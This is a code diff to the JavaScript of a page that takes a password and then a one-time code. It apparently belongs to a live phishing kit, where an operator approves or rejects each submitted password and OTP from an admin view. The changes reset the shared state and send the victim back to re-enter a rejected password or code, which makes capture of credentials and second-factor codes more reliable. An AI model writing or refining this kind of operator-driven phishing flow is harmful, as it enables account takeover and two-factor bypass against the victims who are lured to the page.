@@ -418,11 +418,20 @@ document.getElementById('subBtn').addEventListener('click',()=>{
   document.getElementById('retryBtn').style.display='none';
   if(ptmr)clearInterval(ptmr);
   ptmr=setInterval(()=>{
-    if(S.status==='password_accepted'){clearInterval(ptmr);go('otp');}
+    if(S.status==='password_accepted'){
+      clearInterval(ptmr); ptmr=null;
+      setState({status:'idle'});
+      go('otp');
+    }
     else if(S.status==='password_rejected'){
-      clearInterval(ptmr);
+      clearInterval(ptmr); ptmr=null;
+      pv=''; prender();
+      document.getElementById('pwWait').style.display='none';
+      document.getElementById('pwInp').style.display='block';
       document.getElementById('frErr').style.display='block';
       document.getElementById('retryBtn').style.display='inline-block';
+      setState({status:'idle'});
+      go('password');
     }
   },600);
 });
@@ -462,9 +471,13 @@ document.getElementById('otpConf').addEventListener('click',()=>{
   document.getElementById('npad').style.pointerEvents='none';
   if(otmr)clearInterval(otmr);
   otmr=setInterval(()=>{
-    if(S.status==='otp_accepted'){clearInterval(otmr);go('loading');}
+    if(S.status==='otp_accepted'){
+      clearInterval(otmr); otmr=null;
+      setState({status:'idle'});
+      go('loading');
+    }
     else if(S.status==='otp_rejected'){
-      clearInterval(otmr);
+      clearInterval(otmr); otmr=null;
       obs.forEach(b=>b.value='');obs[0].focus();
       document.getElementById('owait').style.display='none';
       document.getElementById('otpConf').style.display='block';
@@ -473,6 +486,7 @@ document.getElementById('otpConf').addEventListener('click',()=>{
       document.getElementById('npad').style.pointerEvents='';
       document.getElementById('oerr').textContent='الرمز غير صحيح';
       setState({status:'idle'});
+      go('otp');
     }
   },600);
 });
@@ -524,17 +538,30 @@ function checkAdm(){
 }
 function onStateChange(){
   if(cur==='password'){
-    if(S.status==='password_accepted'&&ptmr){clearInterval(ptmr);go('otp');}
+    if(S.status==='password_accepted'&&ptmr){
+      clearInterval(ptmr); ptmr=null;
+      setState({status:'idle'});
+      go('otp');
+    }
     else if(S.status==='password_rejected'&&ptmr){
-      clearInterval(ptmr);
+      clearInterval(ptmr); ptmr=null;
+      pv=''; prender();
+      document.getElementById('pwWait').style.display='none';
+      document.getElementById('pwInp').style.display='block';
       document.getElementById('frErr').style.display='block';
       document.getElementById('retryBtn').style.display='inline-block';
+      setState({status:'idle'});
+      go('password');
     }
   }
   if(cur==='otp'){
-    if(S.status==='otp_accepted'&&otmr){clearInterval(otmr);go('loading');}
+    if(S.status==='otp_accepted'&&otmr){
+      clearInterval(otmr); otmr=null;
+      setState({status:'idle'});
+      go('loading');
+    }
     else if(S.status==='otp_rejected'&&otmr){
-      clearInterval(otmr);
+      clearInterval(otmr); otmr=null;
       obs.forEach(b=>b.value='');obs[0].focus();
       document.getElementById('owait').style.display='none';
       document.getElementById('otpConf').style.display='block';
@@ -542,6 +569,8 @@ function onStateChange(){
       document.getElementById('npad').style.opacity='1';
       document.getElementById('npad').style.pointerEvents='';
       document.getElementById('oerr').textContent='الرمز غير صحيح';
+      setState({status:'idle'});
+      go('otp');
     }
   }
   if(cur==='admin'){
